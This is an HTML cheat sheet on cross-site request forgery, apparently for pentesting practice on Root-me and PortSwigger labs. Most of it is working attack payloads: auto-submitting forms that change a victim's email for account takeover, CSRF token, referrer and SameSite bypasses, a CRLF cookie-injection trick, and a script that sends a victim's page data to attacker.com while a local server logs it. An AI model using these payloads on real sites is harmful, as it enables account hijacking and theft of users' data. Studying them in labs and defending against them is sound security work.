<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF (Cross-Site Request Forgery)</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

    :root {
      --color-dark: #050A0E;
      --color-medium: #0D1B2A;
      --color-light: #1B263B;
      --color-neon-red: #FF073A;
      --color-text-light: #c0c7d6;
    }

    * {
      font-family: 'Fira Code', monospace;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: var(--color-dark);
      color: var(--color-text-light);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(rgba(255, 7, 58, 0.1), rgba(255, 7, 58, 0.05)), url('https://www.transparenttextures.com/patterns/3px-tile.png');
      z-index: -1;
      animation: moveBackground 5s linear infinite;
    }

    @keyframes moveBackground {
      from { background-position: 0 0; }
      to { background-position: 100px 100px; }
    }

    .content-wrapper {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    h1 {
      font-family: 'Press Start 2P', cursive;
      font-size: 24px;
      color: var(--color-neon-red);
      margin-bottom: 25px;
      animation: glitch 0.5s infinite alternate;
      text-align: center;
    }

    h2, h3 {
      color: var(--color-neon-red);
      margin: 20px 0;
      border-bottom: 2px solid var(--color-neon-red);
      padding-bottom: 10px;
      text-align: left;
    }

    p {
      margin: 15px 0;
      line-height: 1.6;
      text-align: justify;
    }

    pre, code {
      background: var(--color-medium);
      padding: 15px;
      border-radius: 5px;
      font-size: 14px;
      color: var(--color-neon-red);
      border: 2px solid var(--color-neon-red);
      margin: 15px 0;
      line-height: 1.5;
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow: hidden;
    }

    strong {
      font-weight: bold;
      color: var(--color-neon-red);
    }

    ::-webkit-scrollbar {
      display: none;
    }

    pre {
      max-width: 100%;
    }

    code {
      display: block;
      padding: 1em;
    }

    .content-wrapper a {
      color: var(--color-neon-red);
      text-decoration: none;
    }

    .content-wrapper a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="content-wrapper">
    <br>
    <br>
    <h1>CSRF (Cross-Site Request Forgery)</h1>
    <p>CSRF is an attacking methodology that forces an end user to execute unexpected actions on a web application. CSRF is an attack against a user's web browser.</p>

    <h2>Account Takeover</h2>
    <p>If the victim user accesses the page where the payload is placed, the victim's account information will be changed to the attacker's information, e.g., Email address or Username.</p>
    <pre><code>&lt;form method="POST" action="https://example.com/change-email"&gt;
  &lt;input type="hidden" name="email" value="attacker@attack.com"&gt;
&lt;/form&gt;
&lt;script&gt;
  document.forms[0].submit();
&lt;/script&gt;
</code></pre>

    <h3>CSRF Token Bypass</h3>
    <p>Below is a method to bypass CSRF token by using another CSRF token that we obtain.</p>
    <pre><code>&lt;form method="POST" action="https://example.com/change-email"&gt;
  &lt;input type="hidden" name="email" value="attacker@attack.com"&gt;
  &lt;input type="hidden" name="csrf" value="PqORuKZMr9zIJxpZC2cA8BgHuQGVkW8h"&gt;
&lt;/form&gt;
&lt;script&gt;
  document.forms[0].submit();
&lt;/script&gt;
</code></pre>

    <pre><code>&lt;form method="POST" action="https://example.com/change-email"&gt;
  &lt;input type="hidden" name="email" value="attacker@attack.com"&gt;
&lt;/form&gt;
&lt;img src="https://example.com/?search=attack%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();" /&gt;
</code></pre>

    <h3>Referrer Validation</h3>
    <p>Referrer validation may be enabled depending on the website. If so, we can try to bypass the validation by manipulating the browser's session history stack.</p>
    <pre><code>&lt;meta name="referrer" content="no-referrer"&gt;

&lt;form method="POST" action="https://example.com/change-email"&gt;
  &lt;input type="hidden" name="email" value="attacker@attack.com"&gt;
&lt;/form&gt;
&lt;script&gt;
  history.pushState("", "", "/?example.com");
  document.forms[0].submit();
&lt;/script&gt;
</code></pre>

    <h2>Reveal Another User Information</h2>
    <p>We can retrieve the information of another user account which accesses the web page where the payload is inserted. Most of the time, this attack can be executed if the web page allows us to XSS.</p>

    <h3>Force Requesting to Our Server</h3>
    <p>Start a web server on the local machine to monitor the access log information.</p>
    <pre><code>sudo python3 -m http.server 80</code></pre>

    <p>Now send a POST request with the victim's information in the target website. For example, assume the target web page contains the current logged-in user information in the element with the id named "userinfo".</p>
    <pre><code>&lt;script&gt;
  var secret = document.getElementById('userinfo');
  var request = new XMLHttpRequest();
  request.open('GET', 'http://attacker.com/' + secret, false);
  request.send();
&lt;/script&gt;
</code></pre>

    <p>After a while, we can retrieve access logs containing the information of victims on the local machine.</p>

    <h2>Bypass SameSite Restriction</h2>
    <p>Reference: <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions</a></p>

    <p>If the SameSite restriction is set as below, we need to bypass it to perform CSRF.</p>
    <pre><code>Set-Cookie: session=abcdef; SameSite=Strict</code></pre>

    <p>If itâ€™s not set, <code>SameSite=Lax</code> is set by default.</p>

    <h3>Lax</h3>
    <p>The Lax is set in the SameSite by default if the website does not specify the SameSite value in the Cookie. It restricts the GET method only so we cannot use the POST method in the payload. However, we can overwrite this method in the GET parameter as below.</p>
    <pre><code>https://example.com/change-email?email=evil@evil.com&amp;_method=POST</code></pre>

    <p>So our CSRF payload would be the following:</p>
    <pre><code>&lt;script&gt;
  document.location = "https://example.com/change-email?email=evil@evil.com&amp;_method=POST";
&lt;/script&gt;
</code></pre>

    <p>Encode the URL value if necessary (URL encoding).</p>

    <h3>Strict</h3>
    <p>If Strict is set as the SameSite value, we cannot send any cross-site requests. However, we may be able to perform CSRF by using redirects. For example, when we send a comment on a blog page, we see a message such as "Thank you for your message" on the result page, then redirect to the post page.</p>
    <pre><code>&lt;script&gt;
  document.location = "https://example.com/post/comment/confirmation?postId=1/../change-email?email=evil@evil.com";
&lt;/script&gt;
</code></pre>

    <p>Encode the URL value if necessary (URL encoding).</p>
    <h2>Labs</h2>
    <p>CSRF 0 protection: <a href="https://www.root-me.org/fr/Challenges/Web-Client/CSRF-0-protection">Root-me</a></p>
    <p>CSRF - contournement de jeton: <a href="https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton">Root-me</a></p>
    <p>CSRF where token is not tied to user session: <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session">Port-Swigger</a></p>
    <p>CSRF where token is duplicated in cookie: <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie">Port-Swigger</a></p>
  </div>
</body>
</html>
